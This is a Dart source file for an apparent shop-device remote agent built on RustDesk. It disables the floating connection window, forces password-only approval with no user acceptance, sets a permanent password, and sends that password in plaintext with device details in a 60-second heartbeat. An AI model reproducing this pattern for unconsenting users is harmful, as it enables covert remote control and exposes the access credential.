// CubeRemote Heartbeat 서비스 (60초 주기)
// + 첫 실행 시 RustDesk 영구 비밀번호 자동 발급, 플로팅 창/인증 모드 강제
import 'dart:async';
import 'dart:math';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter_hbb/models/platform_model.dart';
import 'api_client.dart';
import 'config.dart';
import 'device_info.dart';
import 'update_service.dart';

const PREF_RD_PASSWORD = 'cuberemote_rustdesk_password';

class AgentService {
  static Timer? _timer;
  static bool _running = false;
  static bool _initialized = false;

  static Future<bool> isAgentMode() async {
    final prefs = await SharedPreferences.getInstance();
    return (prefs.getString(PREF_SHOP_ID) ?? '').isNotEmpty;
  }

  /// 1회만 실행: RustDesk 옵션 + 영구 비밀번호 자동 설정
  /// - 플로팅 창 비활성화
  /// - 비밀번호 인증 모드 (수락 불필요)
  /// - 영구 비밀번호: 없으면 생성, 있으면 그대로 RustDesk에 다시 적용
  static Future<String?> _initOnce() async {
    if (_initialized) return null;
    final prefs = await SharedPreferences.getInstance();

    // 옵션 강제 (이미 같은 값이면 no-op)
    try {
      await bind.mainSetLocalOption(key: 'disable-floating-window', value: 'Y');
    } catch (_) {}
    try {
      await bind.mainSetOption(key: 'verification-method', value: 'use-permanent-password');
    } catch (_) {}
    try {
      await bind.mainSetOption(key: 'approve-mode', value: 'password');
    } catch (_) {}

    // 영구 비밀번호: 저장된 게 있으면 재사용, 없으면 새로 생성
    var pwd = prefs.getString(PREF_RD_PASSWORD) ?? '';
    if (pwd.isEmpty) {
      pwd = _generatePassword(12);
      await prefs.setString(PREF_RD_PASSWORD, pwd);
    }
    try {
      await bind.mainSetPermanentPasswordWithResult(password: pwd);
    } catch (_) {}

    _initialized = true;
    return pwd;
  }

  static String _generatePassword(int length) {
    const chars = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    final r = Random.secure();
    return List.generate(length, (_) => chars[r.nextInt(chars.length)]).join();
  }

  static Future<void> start() async {
    if (_running) return;
    if (!await isAgentMode()) return;
    _running = true;

    // 시작과 함께 백그라운드 업데이트 체크 (1회)
    UpdateService.checkInBackground();

    // 즉시 1회 전송 후 주기 시작
    _sendOnce();
    _timer = Timer.periodic(
      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
      (_) => _sendOnce(),
    );
  }

  static void stop() {
    _timer?.cancel();
    _timer = null;
    _running = false;
  }

  static Future<void> _sendOnce() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final shopId   = prefs.getString(PREF_SHOP_ID)   ?? '';
      final pId      = prefs.getString(PREF_P_ID)      ?? '';
      final hId      = prefs.getString(PREF_H_ID)      ?? '';
      final shopNm   = prefs.getString(PREF_SHOP_NM)   ?? '';
      final deviceNm = prefs.getString(PREF_DEVICE_NM) ?? '';
      if (shopId.isEmpty) return;

      // RustDesk 가 ID 발급하기 전엔 heartbeat 보류 (fake device_id 로 row 만들지 않기 위함)
      final deviceId = await DeviceInfoHelper.getRustDeskId();
      if (deviceId == null) return;

      // 옵션 + 영구 비밀번호 1회 셋업 (RustDesk init 후 시점 보장)
      await _initOnce();
      final pwd = prefs.getString(PREF_RD_PASSWORD) ?? '';

      await ApiClient.sendHeartbeat({
        'device_id':     deviceId,
        'p_id':          pId,
        'h_id':          hId,
        'shop_id':       shopId,
        'shop_nm':       shopNm,
        'device_nm':     deviceNm,
        'device_name':   await DeviceInfoHelper.getDeviceName(),
        'ip':            await DeviceInfoHelper.getIpAddress(),
        'battery':       await DeviceInfoHelper.getBatteryLevel(),
        'network':       await DeviceInfoHelper.getNetworkType(),
        'platform':      DeviceInfoHelper.platform,
        'agent_version': AGENT_VERSION,
        'remote_version': '',
        'app_version':   await DeviceInfoHelper.getAppVersion(),
        'os_version':    await DeviceInfoHelper.getOsVersion(),
        'rustdesk_password': pwd,
      });
    } catch (_) {}
  }
}
